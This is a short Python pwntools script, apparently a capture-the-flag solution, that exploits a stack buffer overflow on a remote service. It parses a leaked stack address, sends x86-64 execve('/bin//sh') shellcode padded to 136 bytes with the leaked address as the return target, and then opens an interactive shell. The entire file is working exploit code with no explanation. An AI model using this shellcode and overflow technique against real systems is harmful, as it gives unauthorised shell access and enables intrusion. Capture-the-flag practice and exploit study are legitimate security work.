from pwn import *

r = remote("overly.uniquename.xyz",2082)

leak = r.recvuntil("Enter")[-18:-5]
leak = int(leak,16)

print(hex(leak))
payload = "\x48\x31\xFF\x57\x48\xBF\x2F\x62\x69\x6E\x2F\x2F\x73\x68\x57\x48\x31\xF6\x48\x31\xD2\x48\x89\xE7\x48\x31\xC0\x48\x83\xC0\x3B\x0F\x05"
payload += (136-len(payload))*"\x00" + p64(leak)

r.sendline(payload)
r.interactive()
